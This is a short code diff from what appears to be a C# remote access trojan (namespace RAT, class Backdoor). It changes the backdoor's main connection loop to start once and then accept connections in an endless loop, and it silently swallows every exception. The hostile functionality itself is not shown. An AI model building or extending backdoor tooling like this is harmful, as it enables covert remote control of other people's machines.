@@ -18,10 +18,12 @@ namespace RAT
                 if (args.Length == 3) bd = new Backdoor(int.Parse(args[0]), args[1], args[2]);
                 else if (args.Length == 4) bd = new Backdoor(int.Parse(args[0]), args[1], args[2], bool.Parse(args[3]));
 
+                bd.Start();
                 while (true)
                 {
-                    bd.StartServer();
+                    bd.NextConnection();
                 }
+                bd.Stop();
             }
             catch (Exception) { }
             Console.CancelKeyPress += ConsoleCancelPress;
